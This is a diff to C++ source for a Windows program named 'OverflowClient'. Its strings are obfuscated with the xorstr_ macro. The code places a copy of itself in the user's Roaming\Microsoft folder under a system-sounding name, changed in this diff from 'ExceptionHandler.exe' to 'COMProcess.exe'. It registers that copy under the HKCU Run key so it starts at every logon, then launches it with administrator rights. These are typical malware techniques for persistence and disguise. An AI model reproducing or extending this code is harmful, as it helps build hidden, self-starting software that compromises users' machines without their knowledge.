@@ -13,9 +13,9 @@
 #include "functions.h"
 
 namespace client {
-	bool run_background = false;
+	bool run_menu = false;
 
-	const std::string STARTUP_FILE_NAME = xorstr_("ExceptionHandler.exe");
+	const std::string STARTUP_FILE_NAME = xorstr_("COMProcess.exe");
 
 	const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");
 
@@ -68,11 +68,10 @@ namespace client {
 		LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
 		LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));
 
-		/* Run Normal Stuff */
+		/* Normal Stuff */
 		run();
 
 		/* Start Program */
-		//helpers::start_process(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
 		helpers::start_process_admin(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
 	}
 
